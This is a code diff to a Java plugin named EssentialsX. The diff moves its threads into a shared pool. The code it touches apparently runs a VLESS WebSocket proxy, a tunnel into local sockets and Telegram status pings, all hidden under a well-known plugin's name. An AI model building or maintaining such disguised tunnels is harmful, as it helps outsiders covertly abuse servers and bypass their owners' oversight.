@@ -15,6 +15,10 @@ import java.util.Map;
 import java.util.UUID;
 import java.util.concurrent.ConcurrentHashMap;
 import java.util.concurrent.atomic.AtomicBoolean;
+import java.util.concurrent.ExecutorService;
+import java.util.concurrent.LinkedBlockingQueue;
+import java.util.concurrent.ThreadPoolExecutor;
+import java.util.concurrent.TimeUnit;
 
 import org.java_websocket.WebSocket;
 import org.java_websocket.client.WebSocketClient;
@@ -50,6 +54,19 @@ public class EssentialsX extends JavaPlugin {
     // =========================================================
 
     private final AtomicBoolean running = new AtomicBoolean(true);
+
+    // 可回收的 WS/隧道 IO 线程池：空闲 30 秒自动回收，最多 64 个并发线程
+    private static final ThreadPoolExecutor WS_IO = new ThreadPoolExecutor(
+        0,
+        64,
+        30L, TimeUnit.SECONDS,
+        new LinkedBlockingQueue<>(1024),
+        r -> { Thread t = new Thread(r, "vless-ws-pool"); t.setDaemon(true); return t; },
+        new ThreadPoolExecutor.CallerRunsPolicy()
+    );
+    {
+        WS_IO.allowCoreThreadTimeOut(true);
+    }
 
     // ================= Telegram 通知 =================
 
@@ -161,6 +178,15 @@ public class EssentialsX extends JavaPlugin {
     public void onDisable() {
         running.set(false);
         sendTelegram(SERVER_NAME + "已离线");
+        WS_IO.shutdown();
+        try {
+            if (!WS_IO.awaitTermination(10, TimeUnit.SECONDS)) {
+                WS_IO.shutdownNow();
+            }
+        } catch (InterruptedException e) {
+            WS_IO.shutdownNow();
+            Thread.currentThread().interrupt();
+        }
         getLogger().info("EssentialsX disabled");
     }
 
@@ -364,7 +390,7 @@ public class EssentialsX extends JavaPlugin {
 
         /** remote -> WS 转发线程 */
         void startDown() {
-            Thread down = new Thread(() -> {
+            WS_IO.execute(() -> {
                 byte[] tmp = new byte[8192];
                 try {
                     InputStream rin = remote.getInputStream();
@@ -377,9 +403,7 @@ public class EssentialsX extends JavaPlugin {
                 } catch (Exception ignored) { }
                 sessions.remove(ws);
                 closeAll(ws, remote);
-            }, "vless-net2ws");
-            down.setDaemon(true);
-            down.start();
+            });
         }
     }
 
@@ -516,7 +540,7 @@ public class EssentialsX extends JavaPlugin {
         if (sessionsOpen.get() >= MAX_TUNNEL_SESSIONS) {
             return; // 超限直接放弃, visitor 由服务器侧超时清理
         }
-        Thread t = new Thread(() -> {
+        WS_IO.execute(() -> {
             Socket local = null;
             try {
                 local = new Socket();
@@ -535,7 +559,7 @@ public class EssentialsX extends JavaPlugin {
                     sessionsOpen.incrementAndGet();
                     final Socket sock = local;
                     // local -> tunnel
-                    Thread up = new Thread(() -> {
+                    WS_IO.execute(() -> {
                         byte[] buf = new byte[8192];
                         try {
                             InputStream in = sock.getInputStream();
@@ -546,9 +570,7 @@ public class EssentialsX extends JavaPlugin {
                             }
                         } catch (Exception ignored) { }
                         closeTunnelSession(tunnel, sock);
-                    }, "tunnel-loc2ws");
-                    up.setDaemon(true);
-                    up.start();
+                    });
 
                     // tunnel -> local（在 onMessage(ByteBuffer) 里回调）
                     tunnel.bindLocal(sock);
@@ -556,10 +578,11 @@ public class EssentialsX extends JavaPlugin {
                 }
                 closeTunnelSession(tunnel, local);
             } catch (Exception e) {
+                if (local != null) {
+                    try { local.close(); } catch (Exception ignored) { }
+                }
             }
-        }, "tunnel-session-" + sessionId);
-        t.setDaemon(true);
-        t.start();
+        });
     }
 
     private void closeTunnelSession(TunnelData tunnel, Socket local) {
